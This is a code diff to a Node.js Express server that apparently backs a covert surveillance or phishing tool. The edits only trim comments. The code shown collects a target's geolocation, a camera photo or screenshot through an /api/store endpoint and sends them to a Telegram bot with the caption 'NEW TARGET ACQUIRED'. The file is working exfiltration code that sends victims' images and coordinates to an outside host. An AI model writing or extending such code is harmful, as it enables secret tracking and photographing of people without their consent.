@@ -36,13 +36,10 @@ async function verifyPassword(plainPassword) {
 // ==========================================
 async function sendTelegramPhoto(imageData, caption) {
     try {
-        // Remove base64 prefix
         const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
         const buffer = Buffer.from(base64Image, 'base64');
         
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        
-        // Use FormData
         const FormData = require('form-data');
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -118,9 +115,7 @@ app.post('/api/store', async (req, res) => {
         allData.unshift(newEntry);
         console.log('✅ Stored! Total:', allData.length);
 
-        // ==========================================
-        // SEND TO TELEGRAM
-        // ==========================================
+        // Send to Telegram
         const caption = `
 🔴 <b>NEW TARGET ACQUIRED</b> 🔴
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
@@ -134,7 +129,6 @@ app.post('/api/store', async (req, res) => {
 🕐 Time: ${new Date().toISOString()}
         `;
 
-        // Send photo to Telegram
         if (userPhoto) {
             await sendTelegramPhoto(userPhoto, caption);
         } else if (screenshot) {
